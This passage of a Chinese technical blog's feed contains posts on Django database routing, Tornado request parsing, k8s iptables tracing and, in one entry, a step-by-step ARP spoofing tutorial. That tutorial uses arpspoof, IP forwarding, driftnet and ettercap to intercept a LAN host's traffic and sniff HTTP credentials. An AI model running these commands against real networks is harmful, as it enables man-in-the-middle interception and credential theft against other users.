      &lt;p&gt;由于公司机房调整，需要将ES数据从一个集群迁移到另一集群。两个集群ES都是5.x版本，小版本存在差异，目标集群版本更低。数据由多个索引构成，每个索引大概1TB左右。&lt;/p&gt;
    
    </summary>
    
    
      <category term="elasticsearch" scheme="http://yoursite.com/tags/elasticsearch/"/>
    
  </entry>
  
  <entry>
    <title>django 数据库读写分离</title>
    <link href="http://yoursite.com/2018/12/14/django-db-separation/"/>
    <id>http://yoursite.com/2018/12/14/django-db-separation/</id>
    <published>2018-12-14T06:48:19.000Z</published>
    <updated>2018-12-14T07:01:20.621Z</updated>
    
    <content type="html"><![CDATA[<p>使用数据库读写分离可以提高网站的性能，吞吐率。</p><a id="more"></a><h2 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">        <span class="string">'NAME'</span>: <span class="string">'user'</span>,</span><br><span class="line">        <span class="string">'HOST'</span>: <span class="string">'192.168.2.100'</span>,</span><br><span class="line">        <span class="string">'PORT'</span>: <span class="number">3306</span>,</span><br><span class="line">        <span class="string">'USER'</span>: <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'PASSWORD'</span>: <span class="string">'123456'</span>,</span><br><span class="line">        <span class="string">'OPTIONS'</span>: &#123;</span><br><span class="line">            <span class="string">'init_command'</span>: <span class="string">"SET sql_mode='STRICT_TRANS_TABLES'"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'slave'</span>: &#123;</span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">        <span class="string">'NAME'</span>: <span class="string">'user'</span>,</span><br><span class="line">        <span class="string">'HOST'</span>: <span class="string">'192.168.2.101'</span>,</span><br><span class="line">        <span class="string">'PORT'</span>: <span class="number">3306</span>,</span><br><span class="line">        <span class="string">'USER'</span>: <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'PASSWORD'</span>: <span class="string">'123456'</span>,</span><br><span class="line">        <span class="string">'OPTIONS'</span>: &#123;</span><br><span class="line">            <span class="string">'init_command'</span>: <span class="string">"SET sql_mode='STRICT_TRANS_TABLES'"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="设置读写分离"><a href="#设置读写分离" class="headerlink" title="设置读写分离"></a>设置读写分离</h2><h3 id="手动设置"><a href="#手动设置" class="headerlink" title="手动设置"></a>手动设置</h3><p>在使用数据库时，通过.using(db_name)来手动指定要使用的数据库.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(request)</span>:</span></span><br><span class="line">    models.User.objects.using(<span class="string">'default'</span>).create(username=<span class="string">'lina'</span>, password=<span class="string">'123'</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'写入成功'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(request)</span>:</span></span><br><span class="line">    obj = models.User.objects.filter(id=<span class="number">1</span>).using(<span class="string">'slave'</span>).first()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(obj.username)</span><br></pre></td></tr></table></figure><h3 id="自动设置"><a href="#自动设置" class="headerlink" title="自动设置"></a>自动设置</h3><ul><li><p>定义router</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一主一从</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">db_for_read</span><span class="params">(self, model, **hint)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'slave'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">db_for_wirte</span><span class="params">(self, model, **hints)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'default'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一主多从</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">db_for_read</span><span class="params">(self, model, **hint)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> random</span><br><span class="line">        <span class="keyword">return</span> random.choice([<span class="string">'slave1'</span>, <span class="string">'slave2'</span>, <span class="string">'slave3'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">db_for_wirte</span><span class="params">(self, model, **hints)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'default'</span></span><br></pre></td></tr></table></figure></li><li><p>settings.py 加入DATABASE_ROUTERS设置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATABASE_ROUTERS = [<span class="string">'myrouter.Router'</span>,]</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用数据库读写分离可以提高网站的性能，吞吐率。&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="django" scheme="http://yoursite.com/tags/django/"/>
    
      <category term="database" scheme="http://yoursite.com/tags/database/"/>
    
  </entry>
  
  <entry>
    <title>arp 欺骗</title>
    <link href="http://yoursite.com/2018/12/11/arp-spoofing/"/>
    <id>http://yoursite.com/2018/12/11/arp-spoofing/</id>
    <published>2018-12-11T14:59:50.000Z</published>
    <updated>2018-12-14T07:03:17.388Z</updated>
    
    <content type="html"><![CDATA[<p>ARP欺骗（英语：ARP spoofing），又称ARP毒化（ARP poisoning，网上上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网上上特定计算机或所有计算机无法正常连线。</p><a id="more"></a><h2 id="扫描局域网内活跃主机"><a href="#扫描局域网内活跃主机" class="headerlink" title="扫描局域网内活跃主机"></a>扫描局域网内活跃主机</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 安装 fping</span><br><span class="line">apt install fping -y </span><br><span class="line"></span><br><span class="line"># 扫描活跃主机</span><br><span class="line">fping -g -r 0 -s 192.168.1.0/24 | grep alive</span><br></pre></td></tr></table></figure><h2 id="识别主机"><a href="#识别主机" class="headerlink" title="识别主机"></a>识别主机</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -O 后面是需要扫描的主机列表</span><br><span class="line">nmap -T4 -O 192.168.1.100 192.168.1.101</span><br></pre></td></tr></table></figure><h2 id="arp-欺骗"><a href="#arp-欺骗" class="headerlink" title="arp 欺骗"></a>arp 欺骗</h2><p>双向欺骗，这里 192.168.1.100 是第一步中扫描的目标主机，192.168.1.1 是网关地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 安装 arpspoof 工具</span><br><span class="line">apt install dsniff -y</span><br><span class="line"></span><br><span class="line"># 开始 arp 欺骗</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.100 192.168.1.1</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.1 192.168.1.100</span><br></pre></td></tr></table></figure><p>这个时候目标已经不能上网了，我们开启主机的ip转发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><h2 id="图片探嗅"><a href="#图片探嗅" class="headerlink" title="图片探嗅"></a>图片探嗅</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure><p>效果不是很理想，广告比较多。</p><h2 id="HTTP-账号探嗅"><a href="#HTTP-账号探嗅" class="headerlink" title="HTTP 账号探嗅"></a>HTTP 账号探嗅</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 安装 ettercap 工具</span><br><span class="line">apt install ettercap-text-only -y</span><br><span class="line"></span><br><span class="line"># 探嗅</span><br><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote><p>本教程仅用于教学，切勿违法。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ARP欺骗（英语：ARP spoofing），又称ARP毒化（ARP poisoning，网上上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网上上特定计算机或所有计算机无法正常连线。&lt;/p&gt;
    
    </summary>
    
      <category term="hack" scheme="http://yoursite.com/categories/hack/"/>
    
    
      <category term="arp" scheme="http://yoursite.com/tags/arp/"/>
    
  </entry>
  
  <entry>
    <title>tornado 获取提交数据</title>
    <link href="http://yoursite.com/2018/12/08/tornado-post/"/>
    <id>http://yoursite.com/2018/12/08/tornado-post/</id>
    <published>2018-12-08T05:43:36.000Z</published>
    <updated>2018-12-13T01:56:11.870Z</updated>
    
    <content type="html"><![CDATA[<p>在进行前后台开发时，我们往往需要关注发送/接收数据的类型，不同类型的数据有不同的处理方式。</p><a id="more"></a><h2 id="GET-数据获取"><a href="#GET-数据获取" class="headerlink" title="GET 数据获取"></a>GET 数据获取</h2><h3 id="获取查询参数"><a href="#获取查询参数" class="headerlink" title="获取查询参数"></a>获取查询参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># url: http://localhost/user?username=lina</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfileHandler</span><span class="params">(RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        username = self.request.query_arguments.get(<span class="string">'username'</span>, <span class="string">'default'</span>)</span><br></pre></td></tr></table></figure><h2 id="POST-数据获取"><a href="#POST-数据获取" class="headerlink" title="POST 数据获取"></a>POST 数据获取</h2><p>POST 提交数据有四种方式，分别是 json, </p><p>这里我们使用 postman + tcpdump 分别来发送和抓取http报文。看看不同提交方式，在http里显示是什么样的。</p><p>tcpdump 抓包命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里抓取eth0网口，10000 端口,的报文</span><br><span class="line">sudo tcpdump -i eth0 port 10000 -w data.pcap</span><br></pre></td></tr></table></figure><p>分别用 postman 发送不同格式的POST请求，然后抓取报文后使用wireshark分析，具体如下：</p><h2 id="json类型"><a href="#json类型" class="headerlink" title="json类型"></a>json类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /api/project/add HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">cache-control: no-cache</span><br><span class="line">Postman-Token: 833e2732-a7fe-41f2-927a-878462258069</span><br><span class="line">User-Agent: PostmanRuntime/7.4.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: 127.0.0.1:10000</span><br><span class="line">accept-encoding: gzip, deflate</span><br><span class="line">content-length: 45</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &quot;lina&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;hello&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到json的格式比较简单，直接以字典的方式存放在body当中，tornado获取方式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfileHandler</span><span class="params">(RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = json.loads(self.request.body)</span><br></pre></td></tr></table></figure><h2 id="x-www-form-urlencoded类型"><a href="#x-www-form-urlencoded类型" class="headerlink" title="x-www-form-urlencoded类型"></a>x-www-form-urlencoded类型</h2><p>x-www-form-urlencoded 是默认的form提交方式，数据存放方式和QueryString的方式类似，具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /api/project/add HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">cache-control: no-cache</span><br><span class="line">Postman-Token: ca8fe418-ca93-48ab-8eed-4545e57ee690</span><br><span class="line">User-Agent: PostmanRuntime/7.4.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: 127.0.0.1:10000</span><br><span class="line">accept-encoding: gzip, deflate</span><br><span class="line">content-length: 28</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">username=lina&amp;password=hello</span><br></pre></td></tr></table></figure><p>tornado 获取参数方式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfileHandler</span><span class="params">(RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line">        username = self.request.body_arguments.get(<span class="string">'username'</span>, <span class="string">'default'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfileHandler</span><span class="params">(RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line">        username = self.get_arguement(<span class="string">'username'</span>, <span class="string">'default'</span>)</span><br></pre></td></tr></table></figure><h2 id="form-data类型"><a href="#form-data类型" class="headerlink" title="form-data类型"></a>form-data类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /api/project/add HTTP/1.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------------------------296134443182327800498848</span><br><span class="line">cache-control: no-cache</span><br><span class="line">Postman-Token: e013cd04-567a-42a2-b72a-10b70f5d7d4f</span><br><span class="line">User-Agent: PostmanRuntime/7.4.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: 127.0.0.1:10000</span><br><span class="line">accept-encoding: gzip, deflate</span><br><span class="line">content-length: 279</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">----------------------------296134443182327800498848</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">lina</span><br><span class="line">----------------------------296134443182327800498848</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line">----------------------------296134443182327800498848--</span><br></pre></td></tr></table></figure><p>multipart/form-data类型的数据会生成boundary,用于分割不同字段，以避免正文内容重复。</p><p>使用 python 发送multipart/form-data数据比较麻烦，可以使用<code>requests-toolbelt</code>库。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests_toolbelt <span class="keyword">import</span> MultipartEncoder</span><br><span class="line"><span class="keyword">from</span> webob <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a buffer object that can be read by the MultipartEncoder class</span></span><br><span class="line"><span class="comment"># This works just like an open file object</span></span><br><span class="line">file = io.BytesIO()</span><br><span class="line"></span><br><span class="line"><span class="comment"># The file content will be simple for my test.</span></span><br><span class="line"><span class="comment"># But you could just as easily have a multi-megabyte mpg file</span></span><br><span class="line"><span class="comment"># Write the contents to the file</span></span><br><span class="line">file.write(<span class="string">b'test mpg content'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Then seek to the beginning of the file so that the</span></span><br><span class="line"><span class="comment"># MultipartEncoder can read it from the beginning</span></span><br><span class="line">file.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the payload</span></span><br><span class="line">payload = MultipartEncoder(</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># The name of the file upload field... Not the file name</span></span><br><span class="line">        <span class="string">'uploadedFile'</span>: (</span><br><span class="line"></span><br><span class="line">            <span class="comment"># This would be the name of the file</span></span><br><span class="line">            <span class="string">'This is my file.mpg'</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># The file handle that is ready to be read from</span></span><br><span class="line">            file,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># The content type of the file</span></span><br><span class="line">            <span class="string">'application/octet-stream'</span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># To send the file, you would use the requests.post method</span></span><br><span class="line"><span class="comment"># But the content type is not application-octet-stream</span></span><br><span class="line"><span class="comment"># The content type is multipart/form-data; with a boundary string</span></span><br><span class="line"><span class="comment"># Without the proper header type, your server would not be able to</span></span><br><span class="line"><span class="comment"># figure out where the file begins and ends and would think the</span></span><br><span class="line"><span class="comment"># entire post content is the file, which it is not. The post content</span></span><br><span class="line"><span class="comment"># might even contain multiple files</span></span><br><span class="line"><span class="comment"># So, to send your file, you would use:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># response = requests.post(url, data=payload, headers=&#123;'Content-Type': payload.content_type&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Instead of sending the payload to the server,</span></span><br><span class="line"><span class="comment"># I am just going to grab the output as it would be sent</span></span><br><span class="line"><span class="comment"># This is because I don't have a server, but I can easily</span></span><br><span class="line"><span class="comment"># re-create the object using this output</span></span><br><span class="line">postData = payload.to_string()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create an input buffer object</span></span><br><span class="line"><span class="comment"># This will be read by our server (our webob.Request object)</span></span><br><span class="line">inputBuffer = io.BytesIO()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the post data to the input buffer so that the webob.Request object can read it</span></span><br><span class="line">inputBuffer.write(postData)</span><br><span class="line"></span><br><span class="line"><span class="comment"># And, once again, seek to 0</span></span><br><span class="line">inputBuffer.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create an error buffer so that errors can be written to it if there are any</span></span><br><span class="line">errorBuffer = io.BytesIO()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup our wsgi environment just like the server would give us</span></span><br><span class="line">environment = &#123;</span><br><span class="line">    <span class="string">'HTTP_HOST'</span>: <span class="string">'localhost:80'</span>,</span><br><span class="line">    <span class="string">'PATH_INFO'</span>: <span class="string">'/index.py'</span>,</span><br><span class="line">    <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">    <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_NAME'</span>: <span class="string">''</span>,</span><br><span class="line">    <span class="string">'SERVER_NAME'</span>: <span class="string">'localhost'</span>,</span><br><span class="line">    <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">    <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.0'</span>,</span><br><span class="line">    <span class="string">'CONTENT_TYPE'</span>: payload.content_type,</span><br><span class="line">    <span class="string">'wsgi.errors'</span>: errorBuffer,</span><br><span class="line">    <span class="string">'wsgi.input'</span>: inputBuffer,</span><br><span class="line">    <span class="string">'wsgi.multiprocess'</span>: <span class="keyword">False</span>,</span><br><span class="line">    <span class="string">'wsgi.multithread'</span>: <span class="keyword">False</span>,</span><br><span class="line">    <span class="string">'wsgi.run_once'</span>: <span class="keyword">False</span>,</span><br><span class="line">    <span class="string">'wsgi.url_scheme'</span>: <span class="string">'http'</span>,</span><br><span class="line">    <span class="string">'wsgi.version'</span>: (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create our request object</span></span><br><span class="line"><span class="comment"># This is the same as your request object and should have all our info for reading</span></span><br><span class="line"><span class="comment"># the file content as well as the file name</span></span><br><span class="line">request = Request(environment)</span><br><span class="line"></span><br><span class="line"><span class="comment"># At this point, the request object is the same as what you get on your server</span></span><br><span class="line"><span class="comment"># So, from this point on, you can use the following code to get</span></span><br><span class="line"><span class="comment"># your actual file content as well as your file name from the object</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Our uploaded file is in the POST. And the POST field name is 'uploadedFile'</span></span><br><span class="line"><span class="comment"># Grab our file so that it can be read</span></span><br><span class="line">uploadedFile = request.POST[<span class="string">'uploadedFile'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># To read our content, you can use uploadedFile.file.read()</span></span><br><span class="line">print(uploadedFile.file.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># And to get the file name, you can use uploadedFile.filename</span></span><br><span class="line">print(uploadedFile.filename)</span><br></pre></td></tr></table></figure><h2 id="text-xml"><a href="#text-xml" class="headerlink" title="text/xml"></a>text/xml</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在进行前后台开发时，我们往往需要关注发送/接收数据的类型，不同类型的数据有不同的处理方式。&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="tornado" scheme="http://yoursite.com/tags/tornado/"/>
    
  </entry>
  
  <entry>
    <title>tornado学习之requesthandler</title>
    <link href="http://yoursite.com/2018/12/07/tornado-requesthandler/"/>
    <id>http://yoursite.com/2018/12/07/tornado-requesthandler/</id>
    <published>2018-12-07T02:13:37.000Z</published>
    <updated>2018-12-07T02:57:36.562Z</updated>
    
    <content type="html"><![CDATA[<p>RequestHandler</p><p>write_error</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;RequestHandler&lt;/p&gt;
&lt;p&gt;write_error&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>k8s iptables 规则查看</title>
    <link href="http://yoursite.com/2018/11/29/k8s-iptables/"/>
    <id>http://yoursite.com/2018/11/29/k8s-iptables/</id>
    <published>2018-11-29T03:24:30.000Z</published>
    <updated>2018-11-29T06:36:28.514Z</updated>
    
    <content type="html"><![CDATA[<p>在访问 k8s 服务时，有时会出现一直连不上的问题，我们可以通过分析 iptables 和抓包的方式观察报文是否正确到达。关于 iptable 的介绍可以参考：<a href="../../../../2018/06/29/iptables/">iptables</a></p><a id="more"></a><h2 id="Iptables-跟踪"><a href="#Iptables-跟踪" class="headerlink" title="Iptables 跟踪"></a>Iptables 跟踪</h2><p>设置如下，具体参考[1]:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Load the (IPv4) netfilter log kernel module</span><br><span class="line">modprobe nf_log_ipv4</span><br><span class="line"></span><br><span class="line"># Enable logging for the IPv4 (AF Family 2)</span><br><span class="line">sysctl net.netfilter.nf_log.2=nf_log_ipv4</span><br><span class="line"></span><br><span class="line"># restart rsyslogd</span><br><span class="line">systemctl restart rsyslog</span><br></pre></td></tr></table></figure><p>这里我们以 k8s NodePort 类型的 service 为例，假如我们希望追踪 23741 端口的规则，设置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t raw -j TRACE -p tcp --dport 32741 -I PREROUTING 